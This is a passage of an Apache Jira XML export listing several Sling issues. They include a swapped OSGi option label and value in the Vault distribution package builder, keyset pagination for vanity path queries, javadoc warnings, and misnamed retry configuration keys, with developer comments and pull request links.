                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        <customfield id="customfield_12314020" key="com.atlassian.jira.plugins.jira-development-integration-plugin:devsummary">
                        <customfieldname>Development</customfieldname>
                        <customfieldvalues>
                            
                        </customfieldvalues>
                    </customfield>
                                                                                                                        <customfield id="customfield_12313422" key="com.atlassian.jirafisheyeplugin:jobcheckbox">
                        <customfieldname>Enable Automatic Patch Review</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue><![CDATA[false]]></customfieldvalue>

                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    <customfield id="customfield_12310420" key="com.pyxis.greenhopper.jira:gh-global-rank">
                        <customfieldname>Global Rank</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>9223372036854775807</customfieldvalue>
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                        <customfield id="customfield_12312521" key="com.atlassian.jira.toolkit:LastCommentDate">
                        <customfieldname>Last public comment date</customfieldname>
                        <customfieldvalues>
                            3 years, 5 weeks, 5 days ago
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                <customfield id="customfield_12311820" key="com.pyxis.greenhopper.jira:gh-lexo-rank">
                        <customfieldname>Rank</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>0|z18mmg:</customfieldvalue>

                        </customfieldvalues>
                    </customfield>
                                                                <customfield id="customfield_12310920" key="com.pyxis.greenhopper.jira:gh-global-rank">
                        <customfieldname>Rank (Obsolete)</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>9223372036854775807</customfieldvalue>
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            </customfields>
    </item>


<item>
            <title>[SLING-11582] VaultDistrubtionPackageBuilderFactory mixed up ordering of attribute definition for type</title>
                <link>https://issues.apache.org/jira/browse/SLING-11582</link>
                <project id="12310710" key="SLING">Sling</project>
                    <description>&lt;p&gt;The VaultDistributionPackageBuilderFactory&apos;s AttributeDefintion &lt;span class=&quot;error&quot;&gt;&amp;#91;0&amp;#93;&lt;/span&gt; for &quot;type&quot; has the label and values swapped.&#160;&lt;/p&gt;

&lt;p&gt;The impact is that someone creating an OSGi configuration that uses the value of &quot;in memory packages&quot; will not have in memory packages created as the &quot;label&quot; is what is used to check if packages should be created in memory &lt;span class=&quot;error&quot;&gt;&amp;#91;1&amp;#93;&lt;/span&gt;.&lt;/p&gt;

&lt;p&gt;The OSGi docs for Option &lt;span class=&quot;error&quot;&gt;&amp;#91;2&amp;#93;&lt;/span&gt; identify the label as being a human readable string and the value should be the value.&lt;/p&gt;

&lt;p&gt;At the same time fix the typo in the ObjectClassDefintion &lt;span class=&quot;error&quot;&gt;&amp;#91;3&amp;#93;&lt;/span&gt;&lt;/p&gt;

&lt;p&gt;&#160;&lt;/p&gt;

&lt;p&gt;&lt;span class=&quot;error&quot;&gt;&amp;#91;0&amp;#93;&lt;/span&gt; &lt;a href=&quot;https://github.com/apache/sling-org-apache-sling-distribution-core/blob/master/src/main/java/org/apache/sling/distribution/serialization/impl/vlt/VaultDistributionPackageBuilderFactory.java#L76-L80&quot; class=&quot;external-link&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener&quot;&gt;https://github.com/apache/sling-org-apache-sling-distribution-core/blob/master/src/main/java/org/apache/sling/distribution/serialization/impl/vlt/VaultDistributionPackageBuilderFactory.java#L76-L80&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;&#160;&lt;span class=&quot;error&quot;&gt;&amp;#91;1&amp;#93;&lt;/span&gt;&lt;a href=&quot;https://github.com/apache/sling-org-apache-sling-distribution-core/blob/master/src/main/java/org/apache/sling/distribution/serialization/impl/vlt/VaultDistributionPackageBuilderFactory.java#L241&quot; class=&quot;external-link&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener&quot;&gt;https://github.com/apache/sling-org-apache-sling-distribution-core/blob/master/src/main/java/org/apache/sling/distribution/serialization/impl/vlt/VaultDistributionPackageBuilderFactory.java#L241&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;&#160;&lt;span class=&quot;error&quot;&gt;&amp;#91;2&amp;#93;&lt;/span&gt; &lt;a href=&quot;http://docs.osgi.org/javadoc/r6/cmpn/org/osgi/service/metatype/annotations/Option.html&quot; class=&quot;external-link&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener&quot;&gt;http://docs.osgi.org/javadoc/r6/cmpn/org/osgi/service/metatype/annotations/Option.html&lt;/a&gt;&#160;&lt;/p&gt;

&lt;p&gt;&#160;&lt;span class=&quot;error&quot;&gt;&amp;#91;3&amp;#93;&lt;/span&gt; &lt;a href=&quot;https://github.com/apache/sling-org-apache-sling-distribution-core/blob/master/src/main/java/org/apache/sling/distribution/serialization/impl/vlt/VaultDistributionPackageBuilderFactory.java#L71&quot; class=&quot;external-link&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener&quot;&gt;https://github.com/apache/sling-org-apache-sling-distribution-core/blob/master/src/main/java/org/apache/sling/distribution/serialization/impl/vlt/VaultDistributionPackageBuilderFactory.java#L71&lt;/a&gt;&#160;&lt;/p&gt;</description>
                <environment></environment>
        <key id="13481540">SLING-11582</key>
            <summary>VaultDistrubtionPackageBuilderFactory mixed up ordering of attribute definition for type</summary>
                <type id="1" iconUrl="https://issues.apache.org/jira/secure/viewavatar?size=xsmall&amp;avatarId=21133&amp;avatarType=issuetype">Bug</type>
                                            <priority id="3" iconUrl="https://issues.apache.org/jira/images/icons/priorities/major.svg">Major</priority>
                        <status id="1" iconUrl="https://issues.apache.org/jira/images/icons/statuses/open.png" description="The issue is open and ready for the assignee to start work on it.">Open</status>
                    <statusCategory id="2" key="new" colorName="blue-gray"/>
                                    <resolution id="-1">Unresolved</resolution>
                                        <assignee username="-1">Unassigned</assignee>
                                    <reporter username="bhellema">Ben Helleman</reporter>
                        <labels>
                    </labels>
                <created>Wed, 14 Sep 2022 16:42:41 +0000</created>
                <updated>Fri, 16 Sep 2022 09:30:45 +0000</updated>
                                            <version>Content Distribution Journal Core 0.1.26</version>
                                                    <component>Content Distribution</component>
                        <due></due>
                            <votes>0</votes>
                                    <watches>3</watches>
                                                    <progress percentage="100">
                                    <originalProgress>
                                                    <row percentage="0" backgroundColor="#89afd7"/>
                                                    <row percentage="100" backgroundColor="transparent"/>
                                            </originalProgress>
                                                    <currentProgress>
                                                    <row percentage="100" backgroundColor="#51a825"/>
                                                    <row percentage="0" backgroundColor="#ec8e00"/>
                                            </currentProgress>
                            </progress>
                                    <aggregateprogress percentage="100">
                                    <originalProgress>
                                                    <row percentage="0" backgroundColor="#89afd7"/>
                                                    <row percentage="100" backgroundColor="transparent"/>
                                            </originalProgress>
                                                    <currentProgress>
                                                    <row percentage="100" backgroundColor="#51a825"/>
                                                    <row percentage="0" backgroundColor="#ec8e00"/>
                                            </currentProgress>
                            </aggregateprogress>
                                            <timeestimate seconds="0">0h</timeestimate>
                            <timespent seconds="1200">20m</timespent>
                                <comments>
                            <comment id="17604849" author="bhellema" created="Wed, 14 Sep 2022 16:49:40 +0000"  >&lt;p&gt;Using a UI to manipulate the value at runtime will never work as the value will be set to &quot;in memory package&quot; and never enter the condition &lt;a href=&quot;https://github.com/apache/sling-org-apache-sling-distribution-core/blob/master/src/main/java/org/apache/sling/distribution/serialization/impl/vlt/VaultDistributionPackageBuilderFactory.java#L241&quot; class=&quot;external-link&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener&quot;&gt;https://github.com/apache/sling-org-apache-sling-distribution-core/blob/master/src/main/java/org/apache/sling/distribution/serialization/impl/vlt/VaultDistributionPackageBuilderFactory.java#L241&lt;/a&gt;&lt;/p&gt;</comment>
                            <comment id="17605167" author="marett" created="Thu, 15 Sep 2022 07:45:00 +0000"  >&lt;p&gt;Good catch &lt;a href=&quot;https://issues.apache.org/jira/secure/ViewProfile.jspa?name=bhellema&quot; class=&quot;user-hover&quot; rel=&quot;bhellema&quot;&gt;bhellema&lt;/a&gt; . I guess this was not found before because that configuration is typically done via content package or repoinit, not through the console UI. It makes sense to fix it nevertheless.&lt;/p&gt;

&lt;p&gt;It should be possible to fix it in a backward compatible way. The type conditions should accept both values (e.g. &quot;inmemory&quot; and &quot;in memory packages&quot;).&lt;/p&gt;</comment>
                            <comment id="17605309" author="bhellema" created="Thu, 15 Sep 2022 12:28:14 +0000"  >&lt;p&gt;&lt;a href=&quot;https://issues.apache.org/jira/secure/ViewProfile.jspa?name=marett&quot; class=&quot;user-hover&quot; rel=&quot;marett&quot;&gt;marett&lt;/a&gt; what if we just make the value &quot;inmemory&quot;.&#160; I don&apos;t think anyone will be using &quot;in memory packages&quot; with any success.&#160; Just make the value and label the same.&#160;&lt;/p&gt;</comment>
                            <comment id="17605325" author="marett" created="Thu, 15 Sep 2022 12:58:47 +0000"  >&lt;p&gt;That works as well.&lt;/p&gt;</comment>
                            <comment id="17605707" author="JIRAUSER291263" created="Fri, 16 Sep 2022 08:31:52 +0000"  >&lt;p&gt;&lt;a href=&quot;https://github.com/apache/sling-org-apache-sling-distribution-core/pull/63&quot; class=&quot;external-link&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener&quot;&gt;PR&lt;/a&gt; raised for review.&lt;/p&gt;

&lt;p&gt;cc. &lt;a href=&quot;https://issues.apache.org/jira/secure/ViewProfile.jspa?name=bhellema&quot; class=&quot;user-hover&quot; rel=&quot;bhellema&quot;&gt;bhellema&lt;/a&gt;, &lt;a href=&quot;https://issues.apache.org/jira/secure/ViewProfile.jspa?name=marett&quot; class=&quot;user-hover&quot; rel=&quot;marett&quot;&gt;marett&lt;/a&gt;&lt;/p&gt;</comment>
                    </comments>
                    <attachments>
                    </attachments>
                <subtasks>
                    </subtasks>
                <customfields>
                                                                            <customfield id="customfield_12310310" key="com.atlassian.jira.toolkit:attachments">
                        <customfieldname>Attachment count</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>0.0</customfieldvalue>
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        <customfield id="customfield_12314020" key="com.atlassian.jira.plugins.jira-development-integration-plugin:devsummary">
                        <customfieldname>Development</customfieldname>
                        <customfieldvalues>
                            
                        </customfieldvalues>
                    </customfield>
                                                                                                                        <customfield id="customfield_12313422" key="com.atlassian.jirafisheyeplugin:jobcheckbox">
                        <customfieldname>Enable Automatic Patch Review</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue><![CDATA[false]]></customfieldvalue>

                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    <customfield id="customfield_12310420" key="com.pyxis.greenhopper.jira:gh-global-rank">
                        <customfieldname>Global Rank</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>9223372036854775807</customfieldvalue>
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                        <customfield id="customfield_12312521" key="com.atlassian.jira.toolkit:LastCommentDate">
                        <customfieldname>Last public comment date</customfieldname>
                        <customfieldvalues>
                            3 years, 5 weeks, 6 days ago
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                <customfield id="customfield_12311820" key="com.pyxis.greenhopper.jira:gh-lexo-rank">
                        <customfieldname>Rank</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>0|z18k68:</customfieldvalue>

                        </customfieldvalues>
                    </customfield>
                                                                <customfield id="customfield_12310920" key="com.pyxis.greenhopper.jira:gh-global-rank">
                        <customfieldname>Rank (Obsolete)</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>9223372036854775807</customfieldvalue>
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            </customfields>
    </item>


<item>
            <title>[SLING-11581] use keyset pagination for vanity path query</title>
                <link>https://issues.apache.org/jira/browse/SLING-11581</link>
                <project id="12310710" key="SLING">Sling</project>
                    <description></description>
                <environment></environment>
        <key id="13481473">SLING-11581</key>
            <summary>use keyset pagination for vanity path query</summary>
                <type id="1" iconUrl="https://issues.apache.org/jira/secure/viewavatar?size=xsmall&amp;avatarId=21133&amp;avatarType=issuetype">Bug</type>
                                            <priority id="3" iconUrl="https://issues.apache.org/jira/images/icons/priorities/major.svg">Major</priority>
                        <status id="6" iconUrl="https://issues.apache.org/jira/images/icons/statuses/closed.png" description="The issue is considered finished, the resolution is correct. Issues which are not closed can be reopened.">Closed</status>
                    <statusCategory id="3" key="done" colorName="green"/>
                                    <resolution id="1">Fixed</resolution>
                                        <assignee username="-1">Unassigned</assignee>
                                    <reporter username="reschke">Julian Reschke</reporter>
                        <labels>
                    </labels>
                <created>Wed, 14 Sep 2022 10:13:57 +0000</created>
                <updated>Mon, 18 Nov 2024 09:56:58 +0000</updated>
                            <resolved>Tue, 31 Jan 2023 11:58:14 +0000</resolved>
                                                    <fixVersion>Resource Resolver 1.11.0</fixVersion>
                                    <component>ResourceResolver</component>
                        <due></due>
                            <votes>0</votes>
                                    <watches>1</watches>
                                                    <progress percentage="100">
                                    <originalProgress>
                                                    <row percentage="0" backgroundColor="#89afd7"/>
                                                    <row percentage="100" backgroundColor="transparent"/>
                                            </originalProgress>
                                                    <currentProgress>
                                                    <row percentage="100" backgroundColor="#51a825"/>
                                                    <row percentage="0" backgroundColor="#ec8e00"/>
                                            </currentProgress>
                            </progress>
                                    <aggregateprogress percentage="100">
                                    <originalProgress>
                                                    <row percentage="0" backgroundColor="#89afd7"/>
                                                    <row percentage="100" backgroundColor="transparent"/>
                                            </originalProgress>
                                                    <currentProgress>
                                                    <row percentage="100" backgroundColor="#51a825"/>
                                                    <row percentage="0" backgroundColor="#ec8e00"/>
                                            </currentProgress>
                            </aggregateprogress>
                                            <timeestimate seconds="0">0h</timeestimate>
                            <timespent seconds="6600">1h 50m</timespent>
                                <comments>
                            <comment id="17604005" author="reschke" created="Wed, 14 Sep 2022 10:17:03 +0000"  >&lt;p&gt;Work in progress: &lt;a href=&quot;https://github.com/reschke/sling-org-apache-sling-resourceresolver/tree/patch-5&quot; class=&quot;external-link&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener&quot;&gt;https://github.com/reschke/sling-org-apache-sling-resourceresolver/tree/patch-5&lt;/a&gt;&lt;/p&gt;</comment>
                            <comment id="17605310" author="reschke" created="Thu, 15 Sep 2022 12:29:54 +0000"  >&lt;p&gt;&lt;a href=&quot;https://github.com/apache/sling-org-apache-sling-resourceresolver/pull/82&quot; class=&quot;external-link&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener&quot;&gt;https://github.com/apache/sling-org-apache-sling-resourceresolver/pull/82&lt;/a&gt;&lt;/p&gt;</comment>
                    </comments>
                <issuelinks>
                            <issuelinktype id="10020">
                    <name>Cloners</name>
                                                                <inwardlinks description="is cloned by">
                                        <issuelink>
            <issuekey id="13527656">SLING-11799</issuekey>
        </issuelink>
                            </inwardlinks>
                                    </issuelinktype>
                            <issuelinktype id="12310000">
                    <name>Duplicate</name>
                                                                <inwardlinks description="is duplicated by">
                                        <issuelink>
            <issuekey id="13446524">SLING-11342</issuekey>
        </issuelink>
                            </inwardlinks>
                                    </issuelinktype>
                            <issuelinktype id="10030">
                    <name>Reference</name>
                                                                <inwardlinks description="is related to">
                                        <issuelink>
            <issuekey id="13413193">OAK-9625</issuekey>
        </issuelink>
                            </inwardlinks>
                                    </issuelinktype>
                            <issuelinktype id="12310051">
                    <name>Supercedes</name>
                                            <outwardlinks description="supercedes">
                                        <issuelink>
            <issuekey id="13446524">SLING-11342</issuekey>
        </issuelink>
                            </outwardlinks>
                                                        </issuelinktype>
                    </issuelinks>
                <attachments>
                    </attachments>
                <subtasks>
                    </subtasks>
                <customfields>
                                                                            <customfield id="customfield_12310310" key="com.atlassian.jira.toolkit:attachments">
                        <customfieldname>Attachment count</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>0.0</customfieldvalue>
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        <customfield id="customfield_12314020" key="com.atlassian.jira.plugins.jira-development-integration-plugin:devsummary">
                        <customfieldname>Development</customfieldname>
                        <customfieldvalues>
                            
                        </customfieldvalues>
                    </customfield>
                                                                                                                        <customfield id="customfield_12313422" key="com.atlassian.jirafisheyeplugin:jobcheckbox">
                        <customfieldname>Enable Automatic Patch Review</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue><![CDATA[false]]></customfieldvalue>

                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    <customfield id="customfield_12310420" key="com.pyxis.greenhopper.jira:gh-global-rank">
                        <customfieldname>Global Rank</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>9223372036854775807</customfieldvalue>
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                        <customfield id="customfield_12312521" key="com.atlassian.jira.toolkit:LastCommentDate">
                        <customfieldname>Last public comment date</customfieldname>
                        <customfieldvalues>
                            3 years, 5 weeks, 6 days ago
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                <customfield id="customfield_12311820" key="com.pyxis.greenhopper.jira:gh-lexo-rank">
                        <customfieldname>Rank</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>0|z18jrc:</customfieldvalue>

                        </customfieldvalues>
                    </customfield>
                                                                <customfield id="customfield_12310920" key="com.pyxis.greenhopper.jira:gh-global-rank">
                        <customfieldname>Rank (Obsolete)</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>9223372036854775807</customfieldvalue>
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            </customfields>
    </item>


<item>
            <title>[SLING-11580] Fix javadoc for the rewriter</title>
                <link>https://issues.apache.org/jira/browse/SLING-11580</link>
                <project id="12310710" key="SLING">Sling</project>
                    <description>&lt;p&gt;Currently the javadoc maven-plugin throws warnings. We should fix them before releasing.&lt;/p&gt;</description>
                <environment></environment>
        <key id="13481301">SLING-11580</key>
            <summary>Fix javadoc for the rewriter</summary>
                <type id="1" iconUrl="https://issues.apache.org/jira/secure/viewavatar?size=xsmall&amp;avatarId=21133&amp;avatarType=issuetype">Bug</type>
                                            <priority id="3" iconUrl="https://issues.apache.org/jira/images/icons/priorities/major.svg">Major</priority>
                        <status id="6" iconUrl="https://issues.apache.org/jira/images/icons/statuses/closed.png" description="The issue is considered finished, the resolution is correct. Issues which are not closed can be reopened.">Closed</status>
                    <statusCategory id="3" key="done" colorName="green"/>
                                    <resolution id="1">Fixed</resolution>
                                        <assignee username="joerghoh">Joerg Hoh</assignee>
                                    <reporter username="joerghoh">Joerg Hoh</reporter>
                        <labels>
                    </labels>
                <created>Tue, 13 Sep 2022 12:50:33 +0000</created>
                <updated>Thu, 29 Sep 2022 07:33:16 +0000</updated>
                            <resolved>Tue, 13 Sep 2022 15:05:07 +0000</resolved>
                                    <version>Rewriter 1.3.2</version>
                                    <fixVersion>Rewriter 1.3.4</fixVersion>
                                        <due></due>
                            <votes>0</votes>
                                    <watches>1</watches>
                                                    <progress percentage="100">
                                    <originalProgress>
                                                    <row percentage="0" backgroundColor="#89afd7"/>
                                                    <row percentage="100" backgroundColor="transparent"/>
                                            </originalProgress>
                                                    <currentProgress>
                                                    <row percentage="100" backgroundColor="#51a825"/>
                                                    <row percentage="0" backgroundColor="#ec8e00"/>
                                            </currentProgress>
                            </progress>
                                    <aggregateprogress percentage="100">
                                    <originalProgress>
                                                    <row percentage="0" backgroundColor="#89afd7"/>
                                                    <row percentage="100" backgroundColor="transparent"/>
                                            </originalProgress>
                                                    <currentProgress>
                                                    <row percentage="100" backgroundColor="#51a825"/>
                                                    <row percentage="0" backgroundColor="#ec8e00"/>
                                            </currentProgress>
                            </aggregateprogress>
                                            <timeestimate seconds="0">0h</timeestimate>
                            <timespent seconds="1200">20m</timespent>
                                <comments>
                            <comment id="17603620" author="joerghoh" created="Tue, 13 Sep 2022 15:04:52 +0000"  >&lt;p&gt;Merged with &lt;a href=&quot;https://github.com/apache/sling-org-apache-sling-rewriter/pull/9&quot; class=&quot;external-link&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener&quot;&gt;https://github.com/apache/sling-org-apache-sling-rewriter/pull/9&lt;/a&gt;&lt;/p&gt;</comment>
                    </comments>
                    <attachments>
                    </attachments>
                <subtasks>
                    </subtasks>
                <customfields>
                                                                            <customfield id="customfield_12310310" key="com.atlassian.jira.toolkit:attachments">
                        <customfieldname>Attachment count</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>0.0</customfieldvalue>
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        <customfield id="customfield_12314020" key="com.atlassian.jira.plugins.jira-development-integration-plugin:devsummary">
                        <customfieldname>Development</customfieldname>
                        <customfieldvalues>
                            
                        </customfieldvalues>
                    </customfield>
                                                                                                                        <customfield id="customfield_12313422" key="com.atlassian.jirafisheyeplugin:jobcheckbox">
                        <customfieldname>Enable Automatic Patch Review</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue><![CDATA[false]]></customfieldvalue>

                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    <customfield id="customfield_12310420" key="com.pyxis.greenhopper.jira:gh-global-rank">
                        <customfieldname>Global Rank</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>9223372036854775807</customfieldvalue>
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                        <customfield id="customfield_12312521" key="com.atlassian.jira.toolkit:LastCommentDate">
                        <customfieldname>Last public comment date</customfieldname>
                        <customfieldvalues>
                            3 years, 6 weeks, 1 day ago
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                <customfield id="customfield_12311820" key="com.pyxis.greenhopper.jira:gh-lexo-rank">
                        <customfieldname>Rank</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>0|z18ips:</customfieldvalue>

                        </customfieldvalues>
                    </customfield>
                                                                <customfield id="customfield_12310920" key="com.pyxis.greenhopper.jira:gh-global-rank">
                        <customfieldname>Rank (Obsolete)</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>9223372036854775807</customfieldvalue>
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            </customfields>
    </item>


<item>
            <title>[SLING-11579] Error Distribution queue is not getting created on  forward agent creation</title>
                <link>https://issues.apache.org/jira/browse/SLING-11579</link>
                <project id="12310710" key="SLING">Sling</project>
                    <description>&lt;p&gt;Error Distribution queue is not getting created on &#160;forward agent creation due to mismatch of config variables.&lt;br/&gt;
&lt;a href=&quot;https://github.com/apache/sling-org-apache-sling-distribution-core/blob/master/src/main/java/org/apache/sling/distribution/agent/impl/ForwardDistributionAgentFactory.java#L94&quot; class=&quot;external-link&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener&quot;&gt;https://github.com/apache/sling-org-apache-sling-distribution-core/blob/master/src/main/java/org/apache/sling/distribution/agent/impl/ForwardDistributionAgentFactory.java#L94&lt;/a&gt;&lt;br/&gt;
RETRY_STRATEGY should be &quot;retry.strategy&quot;&lt;/p&gt;

&lt;p&gt;RETRY_ATTEMPTS&#160; should be &quot;retry.attempts&quot;&lt;/p&gt;

&lt;p&gt;CC: &lt;a href=&quot;https://issues.apache.org/jira/secure/ViewProfile.jspa?name=mohiaror&quot; class=&quot;user-hover&quot; rel=&quot;mohiaror&quot;&gt;mohiaror&lt;/a&gt;&#160;&lt;/p&gt;</description>
                <environment></environment>
        <key id="13481221">SLING-11579</key>
            <summary>Error Distribution queue is not getting created on  forward agent creation</summary>
                <type id="1" iconUrl="https://issues.apache.org/jira/secure/viewavatar?size=xsmall&amp;avatarId=21133&amp;avatarType=issuetype">Bug</type>
                                            <priority id="2" iconUrl="https://issues.apache.org/jira/images/icons/priorities/critical.svg">Critical</priority>
                        <status id="5" iconUrl="https://issues.apache.org/jira/images/icons/statuses/resolved.png" description="A resolution has been taken, and it is awaiting verification by reporter. From here issues are either reopened, or are closed.">Resolved</status>
                    <statusCategory id="3" key="done" colorName="green"/>
                                    <resolution id="1">Fixed</resolution>
                                        <assignee username="marett">Timothee Maret</assignee>
                                    <reporter username="malpani@adobe.com">Gagan Malpani</reporter>
                        <labels>
                    </labels>
                <created>Tue, 13 Sep 2022 05:31:34 +0000</created>
                <updated>Thu, 22 Sep 2022 12:35:04 +0000</updated>
                            <resolved>Thu, 22 Sep 2022 12:35:04 +0000</resolved>
                                                    <fixVersion>Content Distribution Core 0.6.0</fixVersion>
                                        <due></due>
                            <votes>0</votes>
                                    <watches>3</watches>
                                                    <progress percentage="100">
                                    <originalProgress>
                                                    <row percentage="0" backgroundColor="#89afd7"/>
                                                    <row percentage="100" backgroundColor="transparent"/>
                                            </originalProgress>
                                                    <currentProgress>
                                                    <row percentage="100" backgroundColor="#51a825"/>
                                                    <row percentage="0" backgroundColor="#ec8e00"/>
                                            </currentProgress>
                            </progress>
                                    <aggregateprogress percentage="100">
                                    <originalProgress>
                                                    <row percentage="0" backgroundColor="#89afd7"/>
                                                    <row percentage="100" backgroundColor="transparent"/>
                                            </originalProgress>
                                                    <currentProgress>
                                                    <row percentage="100" backgroundColor="#51a825"/>
                                                    <row percentage="0" backgroundColor="#ec8e00"/>
                                            </currentProgress>
                            </aggregateprogress>
                                            <timeestimate seconds="0">0h</timeestimate>
                            <timespent seconds="7800">2h 10m</timespent>
                                <comments>
                            <comment id="17603477" author="JIRAUSER295641" created="Tue, 13 Sep 2022 09:14:47 +0000"  >&lt;p&gt;Raised PR : &lt;a href=&quot;https://github.com/apache/sling-org-apache-sling-distribution-core/pull/62&quot; class=&quot;external-link&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener&quot;&gt;https://github.com/apache/sling-org-apache-sling-distribution-core/pull/62&lt;/a&gt;&lt;br/&gt;
&lt;a href=&quot;https://issues.apache.org/jira/secure/ViewProfile.jspa?name=mohiaror&quot; class=&quot;user-hover&quot; rel=&quot;mohiaror&quot;&gt;mohiaror&lt;/a&gt;&#160;&lt;/p&gt;</comment>
                            <comment id="17608257" author="marett" created="Thu, 22 Sep 2022 12:34:44 +0000"  >&lt;p&gt;Thank you. This fixes a regression introduced in the big refactoring tracked in &lt;a href=&quot;https://issues.apache.org/jira/browse/SLING-8595&quot; title=&quot;Update of sling parent pom&quot; class=&quot;issue-link&quot; data-issue-key=&quot;SLING-8595&quot;&gt;&lt;del&gt;SLING-8595&lt;/del&gt;&lt;/a&gt;.&lt;/p&gt;

&lt;p&gt;&#160;&lt;/p&gt;

&lt;p&gt;Merged.&lt;/p&gt;</comment>
                    </comments>
                    <attachments>
                    </attachments>
                <subtasks>
                    </subtasks>
                <customfields>
                                                                            <customfield id="customfield_12310310" key="com.atlassian.jira.toolkit:attachments">
                        <customfieldname>Attachment count</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>0.0</customfieldvalue>
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        <customfield id="customfield_12314020" key="com.atlassian.jira.plugins.jira-development-integration-plugin:devsummary">
                        <customfieldname>Development</customfieldname>
                        <customfieldvalues>
                            
                        </customfieldvalues>
                    </customfield>
                                                                                                                        <customfield id="customfield_12313422" key="com.atlassian.jirafisheyeplugin:jobcheckbox">
                        <customfieldname>Enable Automatic Patch Review</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue><![CDATA[false]]></customfieldvalue>

                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    <customfield id="customfield_12310420" key="com.pyxis.greenhopper.jira:gh-global-rank">
                        <customfieldname>Global Rank</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>9223372036854775807</customfieldvalue>
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                        <customfield id="customfield_12312521" key="com.atlassian.jira.toolkit:LastCommentDate">
                        <customfieldname>Last public comment date</customfieldname>
                        <customfieldvalues>
                            3 years, 4 weeks, 6 days ago
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                <customfield id="customfield_12311820" key="com.pyxis.greenhopper.jira:gh-lexo-rank">
                        <customfieldname>Rank</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>0|z18i88:</customfieldvalue>

                        </customfieldvalues>
                    </customfield>
                                                                <customfield id="customfield_12310920" key="com.pyxis.greenhopper.jira:gh-global-rank">
                        <customfieldname>Rank (Obsolete)</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>9223372036854775807</customfieldvalue>
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            </customfields>
    </item>


<item>
            <title>[SLING-11572] sling-mock-oak: Calling isResourceType() on service resolver throws Login Failure exception</title>
                <link>https://issues.apache.org/jira/browse/SLING-11572</link>
                <project id="12310710" key="SLING">Sling</project>
                    <description>&lt;p&gt;this is a follow-up of &lt;a href=&quot;https://wcm-io.atlassian.net/browse/WTES-44&quot; class=&quot;external-link&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener&quot;&gt;https://wcm-io.atlassian.net/browse/WTES-44&lt;/a&gt;&lt;/p&gt;

